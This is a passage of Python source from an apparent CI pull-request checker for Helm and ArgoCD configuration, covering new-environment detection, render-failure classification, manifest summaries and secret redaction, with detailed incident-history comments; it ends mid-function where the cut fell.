# schema failure is a LIST: acme-config-prod PR 3837 produced 53 violations and
# the comment showed four and a half of them, cut mid path
# ("definitions/a"), so the reader could not tell which services were broken.
# Keep the violation lines whole (they are short, one per line, and the whole
# point of the message) and bound everything else as before.
_HELM_ERROR_MAX = 400
_SCHEMA_ERROR_MAX_LINES = 80


def _cap_helm_error(err: str) -> str:
    """Bound a helm failure for storage, without cutting a violation list."""
    err = err or ""
    if "- at '" not in err:
        return err[:_HELM_ERROR_MAX]
    lines = err.splitlines()
    kept = lines[:_SCHEMA_ERROR_MAX_LINES]
    if len(lines) > _SCHEMA_ERROR_MAX_LINES:
        kept.append(f"- ... and {len(lines) - _SCHEMA_ERROR_MAX_LINES} more lines")
    return "\n".join(kept)


# --- Wiped microservices.definitions guard (COPR-31637) ---------------------
# A config value file (typically cicd-versions.yaml, which ArgoCD merges LAST
# over the chart's own values) that carries
#
#     appspace:
#       microservices:
#         definitions:      # <- key present, NO children => YAML null
#
# collapses the ENTIRE microservices.definitions map to null in the helm
# `merge`. That wipes every per-service image.name override the chart ships
# (appspace-platformservice, appspace-webhookservice, appspace-screenshot,
# ...). Each affected service then falls back to the helper's derived
# `appspace-<key>` name, which for those services points at a registry path
# that has never held an image -> ImagePullBackOff across the whole
# environment. Root cause: acme-config-dev commit 1015bc622 "remove CICD"
# deleted the children but left the key. This guard blocks any PR that
# reintroduces the pattern before it can be merged.
_VALUE_FILE_SUFFIXES = (".yaml", ".yml")


def _values_wipes_definitions(body: str) -> bool:
    """True iff this value-file body sets appspace.microservices.definitions to
    an empty/null map (the dangerous pattern). A missing key, a populated map,
    or unparseable YAML all return False: only an explicitly present-but-empty
    definitions map is a wipe, and we never block on a mere parse error."""
    if not body or not body.strip():
        return False
    try:
        doc = yaml.safe_load(body)
    except Exception:
        return False  # malformed YAML fails elsewhere; never block on it here
    if not isinstance(doc, dict):
        return False
    ms = (doc.get("appspace") or {})
    ms = ms.get("microservices") if isinstance(ms, dict) else None
    if not isinstance(ms, dict):
        return False
    if "definitions" not in ms:
        return False  # absent key: merge leaves the chart's map intact — safe
    defs = ms["definitions"]
    # Present key with null (None) or an empty mapping is the wipe.
    return defs is None or defs == {}


def _detect_wiped_definitions(changed_files: list, sha: str, repo=None) -> list:
    """Return the changed value files whose content at `sha` wipes the
    microservices.definitions map. Only *.yaml/*.yml files are fetched; a
    transient fetch error is skipped (never block a merge on a flaky read)."""
    hits = []
    for f in changed_files:
        if not f.endswith(_VALUE_FILE_SUFFIXES):
            continue
        body, status = _bb_fetch_cached(f, sha, repo=repo)
        if status != BB_OK or body is None:
            continue
        if _values_wipes_definitions(body):
            hits.append(f)
    return hits


def _detect_new_env_candidates(changed_files: list, path_map: dict, renames: dict = None, pr_sha: str = None, repo: str = None) -> list:
    """Scan changed files for patterns that indicate a brand-new environment.

    A 'new env' is a customer.yaml or config.yaml at env-directory depth that is
    NOT covered by any existing ArgoCD app in path_map. Since v2.5.4 (Finding 4)
    this is called unconditionally, whether or not other apps are also affected
    in the same PR — it no longer requires get_affected_apps() to be empty.

    renames (v2.5.4, Finding 4/6 interaction fix): a customer folder rename
    produces a NEW path that is, by definition, not yet in path_map — without
    this check it looked exactly like a brand-new environment and was
    double-evaluated through the wrong path (_render_new_env_diff, which has
    no concept of "this app already exists, just moved" and structurally
    failed on missing post-rename secrets that the RENAMED app already has).
    Confirmed live: PR verifying the rename+bump fix (#6657) correctly showed
    the real diff for the existing app AND incorrectly flagged the same
    folder as a broken new environment. Any new-side path whose old side is
    a known existing app is excluded here — the existing-app path (which
    now correctly follows the rename, see _run_one_diff) already covers it.

    Returns a list of dicts:
      {name, config_file, env_dir, all_yaml_files}
    """
    candidates = {}
    path_map_keys = set(path_map.keys())
    rename_new_sides = set(renames.values()) if renames else set()
    for f in changed_files:
        parts = f.split("/")
        # Must be a top-level env config at adequate depth and not already mapped
        # Pattern: gcp/{lifecycle}/{cloud}/{region}/{tier?}/{env-name}/{file}
        if len(parts) < 5 or parts[-1] not in ("customer.yaml", "config.yaml"):
            continue
        if f in path_map_keys:
            continue
        if f in rename_new_sides:
            continue
        env_dir  = "/".join(parts[:-1])
        env_name = parts[-2]
        if env_dir not in candidates:
            candidates[env_dir] = {
                "name":          env_name,
                "config_file":   f,
                "env_dir":       env_dir,
                "all_yaml_files": [],
            }
    # v2.5.6 (Finding A, PR #6661): a public-cloud (cl-*) environment is ONE
    # environment with sub-app folders (api, app1, app2, cloud, constellation,
    # user-content), each holding its own customer.yaml. The loop above saw
    # every one of those as a separate new environment with "no
    # appspace.version" -> 6 fake structural failures and a RED status for a
    # perfectly valid new environment. Collapse nesting between candidates:
    # if a candidate's env_dir sits inside another candidate's env_dir, it is
    # a sub-app folder of that env, not an environment of its own. Drop the
    # child; the parent's all_yaml_files collection below already picks up
    # the whole tree.
    #
    # v2.5.7 NOTE — do NOT add ancestor-based exclusion against path_map:
    # v2.5.6 shipped a "Rule 2" that excluded candidates nested under the
    # directory of any existing customer.yaml/config.yaml key in path_map,
    # to avoid flagging a new sub-app folder of an EXISTING env as a new
    # environment. Live re-verification (PRs #6660/#6661 on the 2.5.6 pod)
    # showed the repo has hierarchical defaults named config.yaml at every
    # ancestor level (gcp/config.yaml, gcp/qa/config.yaml, ...ap1/
    # config.yaml), all present in path_map — so gcp/ itself became an
    # "existing env root" and EVERY new environment was silently excluded,
    # producing a false green "No ArgoCD apps affected" for PRs that create
    # whole environments. No directory-shape rule can tell an env root from
    # a defaults level in this layout, so no such exclusion exists anymore.
    # The (never observed) new-sub-app-in-existing-env case keeps its
    # pre-v2.5.6 behavior: a red structural finding — a conservative false
    # alarm a human will look at, never a silent skip.
    # v2.13.2 (COPS-2544, live PRs acme-config-prod #3796/#3797): a
    # config.yaml at env-directory depth that declares NO customerName is a
    # cohort/defaults values level -- the file the ApplicationSet generator
    # loads from `{{env}}/../config.yaml` next to every environment folder
    # (hardcoded/migration cohorts, ring folders) -- not an environment.
    # Rendering it as one always fails ("no appspace.version" or missing
    # identity values) and, since the v2.5.4 allow-list, that failure class
    # is FAILED by design: a structurally correct migration PR went red.
    # Declared identity is the same signal the rename verification trusts
    # since v2.5.15 (_extract_appspace_identity): an environment identity
    # file declares customerName; a defaults level does not. Only
    # config.yaml candidates are filtered -- customer.yaml keeps its exact
    # behavior -- and the cl-* parent of v2.5.6 Finding A survives because
    # it DOES declare customerName (verified live on cl-prod-b). A fetch
    # failure keeps the candidate: a conservative red finding a human looks
    # at beats a silent skip.
    if pr_sha:
        for env_dir in list(candidates.keys()):
            info = candidates[env_dir]
            cf = info["config_file"]
            if not cf.endswith("config.yaml"):
                continue
            try:
                content, _st = _bb_fetch_cached(cf, pr_sha, repo=repo)
            except Exception as e:
                debug(f"new-env identity fetch failed for {cf}: {e}; "
                      f"keeping candidate")
                continue
            cname, _suffix = _extract_appspace_identity(content or "")
            if cname is None:
                log(f"new-env candidate '{info['name']}' skipped: {cf} "
                    f"declares no customerName (cohort/defaults values "
                    f"level, not an environment)")
                del candidates[env_dir]
    nested_children = {
        d for d in candidates
        if any(d.startswith(parent + "/") for parent in candidates if parent != d)
    }
    for d in nested_children:
        del candidates[d]
    # Collect all YAML files from changed_files that belong to each candidate env
    for f in changed_files:
        if not f.endswith((".yaml", ".yml")):
            continue
        for env_dir, info in candidates.items():
            if f.startswith(env_dir + "/") or "/".join(f.split("/")[:-1]) == env_dir:
                info["all_yaml_files"].append(f)
    return list(candidates.values())


def _new_env_status(render_error: str):
    """Classify a new-environment render failure into a Bitbucket status.

    Returns (bitbucket_state, is_expected):
      ("SUCCESSFUL", True)  — the failure is EXPECTED for a first-time env
                              (helm needs credentials/constellation files that
                              only exist after the first deploy). Stays green.
      ("FAILED", False)     — anything else. Default is FAILED (v2.5.4,
                              Finding 5) — see below for why.

    Before v2.4.9 every new-env render failure produced the same green
    "will be created on merge" status, so a genuinely broken new env (e.g. a
    missing/typo'd appspace.version) merged with a green check and then simply
    failed to deploy with no earlier warning (FIX E).

    v2.5.4 (Finding 5): FIX E only ever built a DENY-list of known-bad
    patterns (invalid YAML, missing version, chart not found, ...) and
    defaulted everything NOT on that list to green "expected". That default
    was backwards: "chart pull failed" (a generic exception — network,
    disk, or an actual bug) and "registry login may have failed" matched
    none of the deny-list patterns and went green; worse, a genuine
    render_failed error unrelated to missing credentials (the same
    error class fixed for existing envs in Finding 1, e.g. a type-mismatched
    value making a template execution fail) also went green, silently
    telling a reviewer "this will be created cleanly on merge" for a
    brand-new environment that would actually fail to deploy.
    The fix inverts the polarity to an ALLOW-list: only the one specific,
    well-understood shape already documented above and in the original FIX E
    comment — Helm's `required` template function failing because
    constellation/secret files don't exist until first deploy, which always
    surfaces as "Missing required value" — is treated as expected. Every
    other error, recognized or not, defaults to FAILED.
    """
    err = (render_error or "").lower()
    # The one well-understood, deliberately-designed "expected" shape: Helm's
    # `required` function failing on a value that only exists after the first
    # real deploy (constellation files, post-deploy secrets). This is the
    # ONLY case that stays green for a new environment.
    if "missing required value" in err:
        return "SUCCESSFUL", True
    # Everything else — invalid YAML, missing appspace.version, chart/OCI
    # not found, a generic chart-pull exception, a registry-login failure,
    # or any other render_failed error — is FAILED by default now.
    return "FAILED", False



def _summarize_rendered_manifest(rendered: str) -> tuple:
    """Summarize a rendered multi-document manifest for the PR comment.

    v2.5.6 (Finding B): a successfully rendered NEW environment used to be
    posted as up to 30,000 chars of raw "+" pseudo-diff — a wall of text
    with no review value (everything is new, there is nothing to compare).
    What a reviewer needs instead: how many resources, of which kinds, and
    which applications. This helper extracts exactly that.

    Line-based parsing on purpose: PyYAML is not in the container (H9 was
    deferred for that same reason) and helm's own output is stable enough
    for top-level `kind:` and `metadata: -> name:` extraction.

    Returns (total_resources, kind_counts: dict, workload_names: sorted list).
    Workloads are Deployment/StatefulSet/DaemonSet/CronJob/Job — the names a
    reviewer recognizes as "applications".
    """
    WORKLOAD_KINDS = {"Deployment", "StatefulSet", "DaemonSet", "CronJob", "Job"}
    total = 0
    kind_counts = {}
    workloads = set()
    for doc in rendered.split("\n---"):
        kind = None
        name = None
        in_metadata = False
        for line in doc.splitlines():
            if line.startswith("kind:") and kind is None:
                kind = line.split(":", 1)[1].strip()
            elif line.startswith("metadata:"):
                in_metadata = True
            elif in_metadata and name is None and line.startswith("  name:"):
                name = line.split(":", 1)[1].strip().strip("'\"")
            elif in_metadata and line and not line.startswith(" "):
                in_metadata = False
        if not kind:
            continue
        total += 1
        kind_counts[kind] = kind_counts.get(kind, 0) + 1
        if kind in WORKLOAD_KINDS and name:
            workloads.add(name)
    return total, kind_counts, sorted(workloads)


def _redact_rendered_manifest(rendered: str) -> str:
    """Redact a full rendered multi-document manifest before it can reach a
    PR comment or the full-diff artifact (v2.25.0).

    Mirrors _redact_for_display per document instead of per diff section: a
    v1 `kind: Secret` document is whole-masked; every other document gets
    the key-name redaction plus the two-line k8s env-var pass. Kinds merely
    containing "Secret" (ExternalSecret, SealedSecret) hold references, not
    values, and are NOT whole-masked. Structural scheduling fields (`key`,
    `topologyKey`) stay exempt from redaction via _redact_sensitive itself.
    """
    out = []
    for doc in rendered.split("\n---"):
        kind = None
        for line in doc.splitlines():
            if line.startswith("kind:"):
                kind = line.split(":", 1)[1].strip()
                break
        if kind == "Secret":
            # _redact_secret_section is built for diff section BODIES whose
            # header carries the resource identity — on a whole document it
            # would mask `kind:` and `metadata.name:` too, leaving an
            # anonymous blob. Keep the identity part (apiVersion / kind /
            # metadata) readable, but still run it through the standard
            # key-name redaction (chart-authored annotations could hold
            # values), and whole-mask everything from the first top-level
            # `data:` / `stringData:` on with the proven Secret masker
            # (covers block scalars, multi-line PEM blobs, etc.).
            doc_lines = doc.split("\n")
            split_at = next((i for i, l in enumerate(doc_lines)
                             if l.startswith(("data:", "stringData:"))),
                            None)
            if split_at is None:
                out.append(_redact_k8s_env_pairs(_redact_sensitive(doc)))
            else:
                head = "\n".join(doc_lines[:split_at])
                tail = "\n".join(doc_lines[split_at:])
                out.append(_redact_k8s_env_pairs(_redact_sensitive(head))
                           + "\n" + _redact_secret_section(tail))
        else:
            out.append(_redact_k8s_env_pairs(_redact_sensitive(doc)))
    return "\n---".join(out)


def _evaluate_new_envs(new_env_candidates: list, pr_sha: str,
                       with_full_output: bool = False) -> tuple:
    """Render and classify a list of new-environment candidates.

    v2.5.4 (Finding 4): extracted from process_pr's inline logic so the same
    rendering/classification path can be reused whether the new environments
    are the ONLY thing in the PR, or bundled alongside changes to already-
    existing apps. Before this refactor, new-env detection only ran when
    zero existing apps were affected, so a new environment added in the same
    commit as an existing-app change was silently never evaluated at all —
    confirmed live with both a broken (#6646) and a fully valid (#6652) new
    environment.

    Returns (comment_lines, structural_envs, total_new_resources):
      comment_lines     — a self-contained "### New Environment(s) Detected"
                          markdown block (no outer "## <title>" header, no
                          trailing Status line — the caller decides how that
                          fits into its own comment/footer).
      structural_envs   — names of environments with a structural problem
                          (FIX E) that must block the PR, not go green.
      total_new_resources — sum of resources that would be created across
                          all successfully-rendered new environments.
    """
    new_env_sections = []
    full_sections = []      # (name, version, n_res, redacted manifest)
    for env_info in new_env_candidates:
        # v2.13.2 (COPS-2544, explicit request): every ApplicationSet with a
        # customer.yaml git generator also loads `{{env}}/../config.yaml` as
        # a matrix generator (verified live on the hub 2026-07-28: all of
        # them except the six gcp/aec/ ones). If that cohort file does not
        # exist at the PR head, the matrix yields ZERO results: no
        # Application is ever generated for this path, and a moved
        # environment gets decommissioned instead of followed. A green
        # "will be created on merge" here would be false, and the render
        # error it produces instead is misleading. Block with the reason.
        # A transient fetch error must NOT block (only a genuine 404 is a
        # stable fact); gcp/aec/ paths have no cohort generator and are
        # exempt. The wording below must never contain the phrase
        # "missing required value": that exact phrase is the one allowed
        # green shape in _new_env_status.
        env_dir = env_info.get("env_dir", "")
        if not env_dir.startswith("gcp/aec/") and "/" in env_dir:
            cohort_path = env_dir.rsplit("/", 1)[0] + "/config.yaml"
            _c, _cohort_st = _bb_fetch_cached(cohort_path, pr_sha)
            # COPS-2545 (F4, live scenario 5): a cohort file that EXISTS but
            # cannot be parsed is the same contract violation as a missing
            # one: the ApplicationSet git generator cannot load it, the
            # matrix yields zero results, and nothing deploys on merge. The
            # old behavior tolerated it silently because the new-env render
            # never fed the cohort to helm (F1). Block with the reason.
            if _cohort_st == BB_OK and _c:
                try:
                    yaml.safe_load(_c)
                except Exception as ye:
                    reason = (
                        f"the ApplicationSet generator loads `{cohort_path}` "
                        f"next to every environment folder, and that file "
                        f"cannot be parsed as YAML ({str(ye).splitlines()[0][:120]}). "
                        f"The generator produces zero Applications for this "
                        f"environment until the file is valid, so nothing "
                        f"deploys on merge. Fix the YAML and push again to "
                        f"unblock.")
                    log(f"  new env {env_info['name']}: blocked - {reason}",
                        "WARNING")
                    new_env_sections.append({
                        "name": env_info["name"], "version": "unknown",
                        "files": env_info["all_yaml_files"], "n_res": 0,
                        "kind_counts": None, "workloads": None,
                        "error": reason, "blocked": True,
                        "blocked_headline": ("a required cohort `config.yaml` "
                                             "cannot be parsed"),
                    })
                    continue
            if _cohort_st == BB_NOT_FOUND:
                reason = (
                    f"the ApplicationSet generator loads `{cohort_path}` "
                    f"next to every environment folder, and that file does "
                    f"not exist at this commit. Without it the generator "
                    f"produces zero Applications for this environment, so "
                    f"nothing deploys on merge, and a moved environment "
                    f"would be decommissioned instead of followed. Add that "
                    f"config.yaml (a 4 line placeholder is enough, see "
                    f"gcp/prod/private-cloud/eu1-b/hardcoded/migration/"
                    f"monthly/config.yaml) and push again to unblock.")
                log(f"  new env {env_info['name']}: blocked - {reason}",
                    "WARNING")
                new_env_sections.append({
                    "name": env_info["name"], "version": "unknown",
                    "files": env_info["all_yaml_files"], "n_res": 0,
                    "kind_counts": None, "workloads": None,
                    "error": reason, "blocked": True,
                    "blocked_headline": ("a required cohort `config.yaml` is "
                                         "missing"),
                })
                continue

        # COPS-2552 (live incident, Derek 2026-07-29): a derived GCP service
        # account name over 30 chars renders and syncs FINE (valid YAML,
        # valid k8s object name) and only fails later inside the Config
        # Connector reconcile loop against the GCP IAM API -- ArgoCD reports
        # Synced, health Degraded, and the real cause (IAMServiceAccount
        # UpdateFailed) is invisible unless someone opens `kubectl describe`
        # on that specific object. Check it here, before the chart render,
        # using the identical ancestor-chain _render_new_env_diff itself
        # renders with, so this can never disagree with what actually ships.
        _env_flat = _flat_yaml_cached(env_info["config_file"], pr_sha)
        _warn_if_name_invariant_broken(_env_flat)
        _gsa_status, _gsa_detail = _check_customer_name(
            _env_flat.get("appspace.customerName"))
        if _gsa_status == "invalid":
            log(f"  new env {env_info['name']}: blocked - {_gsa_detail}",
                "WARNING")
            new_env_sections.append({
                "name": env_info["name"], "version": "unknown",
                "files": env_info["all_yaml_files"], "n_res": 0,
                "kind_counts": None, "workloads": None,
                "error": _gsa_detail, "blocked": True,
                "blocked_headline": ("this environment's name is too long for "
                                     "GCP"),
            })
            continue
        render_result = _render_new_env_diff(env_info, pr_sha)
        # Returns (rendered_manifest, error [, n_res [, version]])
        rendered   = render_result[0]
        render_err = render_result[1]
        n_res      = render_result[2] if len(render_result) > 2 else 0
        detected_version = render_result[3] if len(render_result) > 3 else None
        env_name = env_info["name"]
        display_version = detected_version or env_info.get("version", "unknown")
        if rendered:
            log(f"  new env {env_name}: rendered {n_res} resource(s)")
            # v2.5.6 (Finding B): summarize instead of dumping the manifest.
            total, kind_counts, workloads = _summarize_rendered_manifest(rendered)
            new_env_sections.append({
                "name": env_name, "version": display_version,
                "files": env_info["all_yaml_files"], "n_res": total or n_res,
                "kind_counts": kind_counts, "workloads": workloads, "error": None,
            })
            if with_full_output:
                # v2.25.0: keep the complete (redacted) manifest so the
                # caller can append it after the summary — the comment
                # inlines what fits, the full-diff artifact keeps it all.
                full_sections.append((env_name, display_version,
                                      total or n_res,
                                      _redact_rendered_manifest(rendered)))
        else:
            log(f"  new env {env_name}: render failed - {render_err}", "WARNING")
            new_env_sections.append({
                "name": env_name, "version": display_version,
                "files": env_info["all_yaml_files"], "n_res": 0,
                "kind_counts": None, "workloads": None, "error": render_err,
            })

    lines = [
        f"### \U0001f195 New Environment(s) Detected", "",
        f"This PR adds configuration for **{len(new_env_candidates)} new "
        f"environment(s)** that do not yet exist in ArgoCD. "
        f"The ApplicationSet will create them automatically after merge.", "",
    ]
    for sec in new_env_sections:
        lines.append(f"#### `{sec['name']}` (chart `{sec['version']}`)")
        lines.append("")
        if sec["files"]:
            lines.append("**Files added:**")
            for f in sorted(sec["files"])[:15]:
                lines.append(f"- `{f}`")
            if len(sec["files"]) > 15:
                lines.append(f"- *... {len(sec['files'])-15} more files*")
            lines.append("")
        if sec.get("blocked"):
            # COPS-2552: three different findings now block here (missing
            # cohort file, unparseable cohort file, name too long for GCP),
            # so the headline must come from the finding. It used to be
            # hardcoded to the cohort case, which announced a name-length
            # rejection as "a required cohort config.yaml is missing" --
            # false, and directly contradicting the correct explanation
            # printed right underneath. Caught by the live PR 3830
            # verification, not by any unit test.
            lines.append(
                f"\u26d4 **Blocked: "
                f"{sec.get('blocked_headline', 'this PR cannot work as written')}.**")
            lines.append("")
            lines.append(f"This PR cannot work as written: {sec['error']}")
        elif sec["kind_counts"] is not None:
            # v2.5.6 (Finding B): a completely new environment has nothing to
            # compare against — the full manifest is a wall of "+" lines with
            # no review value. Show what a reviewer actually needs instead.
            kind_breakdown = ", ".join(
                f"{n} {k}" for k, n in sorted(
                    sec["kind_counts"].items(), key=lambda kv: (-kv[1], kv[0])))
            lines.append(
                "\U0001f680 **A completely new environment will be provisioned "
                "from scratch.** The full rendered output is too large to "
                "display here, so this is a summary of what will be created "
                "on merge:")
            lines.append("")
            lines.append(f"- **Chart version:** `{sec['version']}`")
            lines.append(f"- **Resources:** {sec['n_res']} total — {kind_breakdown}")
            if sec["workloads"]:
                # 40 names is a 765-char wall of wrapped inline code in
                # Bitbucket (measured on PR #3863 and #3864). The count is
                # the number that matters; the full list is on the
                # full-diff page.
                shown = sec["workloads"][:12]
                apps = ", ".join(f"`{w}`" for w in shown)
                more = (f" *(+{len(sec['workloads'])-12} more)*"
                        if len(sec["workloads"]) > 12 else "")
                lines.append(
                    f"- **Applications ({len(sec['workloads'])}):** {apps}{more}")
        else:
            lines.append(
                "\U0001f4cb **Resource preview not available for new environments.**  \n"
                "The chart requires additional constellation files and credentials that "
                "are provisioned after the first deployment. This is expected.  \n"
                "All resources will be created from scratch when this PR is merged."
            )
            if sec["error"]:
                state, expected = _new_env_status(sec["error"])
                if not expected:
                    lines.append(
                        f"  \n\u26a0\ufe0f **This is a structural problem, not the "
                        f"usual first-deploy case — it must be fixed before merge:** "
                        f"{sec['error'][:160]}")
                    # COPS-2545 (F3): the raw helm nil-pointer on
                    # $microservice.image.* means a microservices.definitions
                    # entry exists with no image mapping behind it. The raw
                    # error names a template line, not the actual mistake.
                    if ("nil pointer" in sec["error"]
                            and "microservice" in sec["error"]):
                        lines.append(
                            "  \n\U0001f4a1 *Hint: a `microservices.definitions` "
                            "entry in this PR has no image/version mapping at "
                            "any level (ring config or cicd-versions.yaml). "
                            "Every definitions key needs one.*")
                elif "helm template failed" not in sec["error"]:
                    lines.append(f"  \n*Technical detail: {sec['error'][:120]}*")
        lines.append("")

    total_new = sum(s["n_res"] for s in new_env_sections)
    # FIX E (v2.4.9): classify each new-env failure. A structural failure
    # (missing version, unparseable config, chart missing, or — since
    # v2.5.4 Finding 5 — any unrecognized error) must NOT get the green
    # "will be created on merge" status.
    structural_envs = [
        s["name"] for s in new_env_sections
        if s["error"] and _new_env_status(s["error"])[1] is False
    ]
    if not with_full_output:
        return lines, structural_envs, total_new
    # v2.25.0: the complete rendered output as a separate appendix block.
    # Kept OUT of `lines` on purpose: it must always be spliced at the very
    # end of the comment body, so the footer-preserving middle-cut truncation
    # sacrifices the manifest first and never the summary or, in mixed PRs,
    # the existing-app diffs.
    full_lines = []
    if full_sections:
        full_lines = [
            "### \U0001f4c4 Full rendered output", "",
            "The complete redacted manifest of everything that will be "
            "created on merge, kept for traceability. If Bitbucket "
            "truncates this comment, the untruncated output stays "
            "available through the build status link.", "",
        ]
        for name, ver, nres, redacted in full_sections:
            full_lines += [
                f"#### `{name}` — chart `{ver}`, {nres} resource(s)", "",
                "```yaml",
                redacted.strip("\n"),
                "```", "",
            ]
    return lines, structural_envs, total_new, full_lines


def _new_env_value_chain(env_info: dict, pr_sha: str, repo: str = None) -> tuple:
    """Build and fetch the value-file chain for a new-environment candidate:
    every ancestor config.yaml from the repo root down to env_dir's parent,
    plus the environment's own added files, root-to-leaf -- the exact
    cascade a live Application uses (COPS-2545 F1, verified against
    pv-dkv-a-ms.spec.sources[0].helm.valueFiles). Missing ancestor levels
    are skipped, mirroring ignoreMissingValueFiles.

    Extracted out of _render_new_env_diff (COPS-2552). The GSA-name guard
    that originally shared it was replaced in COPS-2562 by a cheap cap read
    straight from the environment's own leaf file, so this is once again
    used only by the chart render itself.

    Returns (ordered_value_files, vals) -- "$config/"-prefixed paths and
    their fetched content, the shape _effective_chart_version expects.
    """
    ancestor_levels = []
    probe = env_info["env_dir"]
    while "/" in probe:
        probe = probe.rsplit("/", 1)[0]
        ancestor_levels.append(f"$config/{probe}/config.yaml")
    ancestor_levels.reverse()  # root first, most specific last
    env_own = sorted(set(
        f"$config/{f}" for f in env_info["all_yaml_files"]
        if f.endswith((".yaml", ".yml"))
    ))
    if not env_own:
        env_own = [f"$config/{env_info['config_file']}"]
    # dict.fromkeys keeps first occurrence: ancestors first, env files last
    # (helm: later files win, so the env overrides its ancestors).
    ordered = list(dict.fromkeys(ancestor_levels + env_own))
    vals = _fetch_value_files(ordered, pr_sha)
    return ordered, vals


def _render_new_env_diff(env_info: dict, pr_sha: str) -> tuple:
    """Attempt to render a new environment's chart and return all resources as diff.

    Fetches the config file from Bitbucket, extracts appspace.version, pulls the
    chart from OCI, and runs helm template with the value files found in changed
    files for that env directory.

    Returns (diff_text, error_str). diff_text is None on failure.
    """
    config_file = env_info["config_file"]
    env_name    = env_info["name"]

    # 1. Fetch config to get appspace.version
    raw_config, status = _bb_fetch_cached(config_file, pr_sha)
    if status != BB_OK or not raw_config:
        return None, f"could not fetch {config_file} from Bitbucket", 0, None
    version = _extract_chart_version(raw_config)
    version_src = config_file
    if not version:
        # COPS-2507 (Finding B): most environments do NOT define a version in
        # their own customer.yaml — measured in acme-config-prod, only 12/265
        # gcp envs do; the other 95% inherit it from an ancestor config.yaml
        # (cohort/lifecycle/cloud level), exactly how the Helm hierarchy merge
        # resolves it. Walk ancestor config.yaml files at the PR sha, most
        # specific level wins. Only if NO level defines a version is this a
        # structural failure. Fetches are (sha,path)-cached and each PR has
        # at most ~6 ancestor levels, so this is cheap.
        env_dir = env_info["env_dir"]
        ancestors = []
        if config_file != f"{env_dir}/config.yaml":
            ancestors.append(f"{env_dir}/config.yaml")
        probe = env_dir
        while "/" in probe:
            probe = probe.rsplit("/", 1)[0]
            ancestors.append(f"{probe}/config.yaml")
        for anc in ancestors:
            raw_anc, st_anc = _bb_fetch_cached(anc, pr_sha)
            if st_anc == BB_OK and raw_anc:
                v = _extract_chart_version(raw_anc)
                if v:
                    version, version_src = v, anc
                    debug(f"new env {env_name}: version {version} inherited "
                          f"from {anc}")
                    break
    if not version:
        return None, ("no appspace.version found in config file or any "
                      "ancestor config.yaml level"), 0, None

    # 2. Determine registry from the chart version tag.
    # Dev versions contain "-dev"; release versions do not.
    # Look up the registry from existing ms apps so we use the correct hostname.
    DEV_REG     = "helm-oci-dev.repo.appspace.com"
    RELEASE_REG = "helm-oci-release.repo.appspace.com"
    is_dev_version = "-dev" in version or version.endswith("-dev")
    if is_dev_version:
        registry = next(
            (r for r in _app_chart_registry_map.values() if "dev" in r),
            DEV_REG,
        )
    else:
        registry = next(
            (r for r in _app_chart_registry_map.values() if "release" in r),
            RELEASE_REG,
        )
    # Always render with appspace-micro-services for new env previews.
    # Other chart types (appspace-glb, appspace-supporting-services) require
    # values that a brand-new environment customer.yaml will not have yet, and
    # their templates would fail with missing-value errors. The ms chart gives
    # the most useful resource preview for a reviewer.
    chart_name = "appspace-micro-services"

    # 3. Pull chart
    try:
        chart_path = _ensure_chart(registry, chart_name, version)
    except OciChartNotFound as e:
        return None, f"chart not found in OCI: {str(e)[:120]}", 0, version
    except Exception as e:
        return None, f"chart pull failed: {str(e)[:120]}", 0, version

    if not chart_path:
        return None, "chart pull returned None (registry login may have failed)", 0, version

    # 4-5. Gather and fetch the value-file chain (COPS-2545 F1, extracted to
    # _new_env_value_chain in COPS-2552 so the GSA-name guard shares it).
    value_files_prefixed, vals = _new_env_value_chain(env_info, pr_sha)
    if not vals:
        return None, "could not fetch value files from Bitbucket", 0, version

    # 6. Render with helm template
    namespace = env_name
    rendered, err = _helm_template(chart_path, env_name, namespace, vals)
    if err or not rendered:
        # v2.5.4 (Finding 4/5 interaction fix): do NOT re-truncate here. `err`
        # is already capped at 400 chars by _helm_template. The old [:120]
        # cut here often sliced off "Missing required value" when the file
        # path/line-number prefix in the real helm error was long (e.g.
        # ".../legacy-db-credentials.yaml:2:27): Missing requir" — cutting
        # the exact phrase _new_env_status's allow-list checks for, and
        # misclassifying a genuinely expected new-env error as structural.
        # Confirmed live on PR #6657. Display-layer truncation for the
        # comment body still happens separately in _evaluate_new_envs.
        return None, f"helm template failed: {err or 'no output'}", 0, version

    # 7. Return the raw rendered manifest. v2.5.6 (Finding B): the caller
    # (_evaluate_new_envs) now builds a compact provisioning summary from it
    # instead of posting the manifest as a "+" pseudo-diff — everything in a
    # brand-new environment is new, so a diff view has no review value.
    resource_count = rendered.count("\nkind: ") + (1 if rendered.startswith("kind: ") else 0)
    return rendered, None, resource_count, version


def _resolve_effective_pr_chart_revision(app, pr_sha, main_sha=None, renames=None):
    """Effective appspace.version for an app at pr_sha (Helm last-wins).

    COPR-31756: a parent cohort config.yaml bump must not be treated as the
    app's new chart revision when a later valueFile (typically customer.yaml)
    still pins a different version. Returns None when the chain cannot be
    resolved or no file sets appspace.version.

    Safety: if the chain includes a customer.yaml and that file could not be
    fetched (and was not filled via a trusted rename), return None instead of
    letting an ancestor win. A missing leaf under Bitbucket flakiness would
    otherwise reintroduce the false-downgrade this ticket fixed.
    """
    value_files = _app_value_files_map.get(app) or []
    if not value_files:
        return None
    pr_value_files = value_files
    if renames:
        env_move = _detect_env_move(value_files, renames, main_sha, pr_sha)
        if env_move:
            old_env_dir, new_env_dir = env_move
            pr_value_files = _rebase_value_files(value_files, old_env_dir, new_env_dir)
    try:
        vals = _fetch_value_files(pr_value_files, pr_sha)
    except Exception as e:
        log(f"_resolve_effective_pr_chart_revision: value fetch failed for "
            f"{app}: {str(e)[:150]}", "WARNING", app=app)
        return None
    # Per-file renames (customer.yaml moved without a full tier move): fill
    # 404s from the rename target so last-wins still sees the leaf pin.
    if renames:
        trusted_dirs = _trusted_rename_dirs(renames, main_sha, pr_sha)
        for vf in pr_value_files:
            if vals.get(vf):
                continue
            clean = posixpath.normpath(vf.replace("$config/", "").lstrip("/"))
            if clean not in renames:
                continue
            new_clean = renames[clean]
            if not _is_trusted_rename(clean, new_clean, trusted_dirs, main_sha, pr_sha):
                continue
            new_key = (pr_sha, new_clean)
            with _vf_cache_lock:
                cached = _vf_cache.get(new_key, ...)
            if cached is ...:
                raw, status = _bb_fetch_status(new_clean, pr_sha)
                if status in (BB_OK, BB_NOT_FOUND):
                    with _vf_cache_lock:
                        _vf_cache[new_key] = raw
                content = raw
            else:
                content = cached
            if content:
                vals[vf] = content
    # Refuse ancestor-only resolution when the leaf pin file is in the chain
    # but missing from vals. cicd-versions.yaml is often last and rarely sets
    # appspace.version; customer.yaml is the pin that mattered in #3859.
    for vf in pr_value_files:
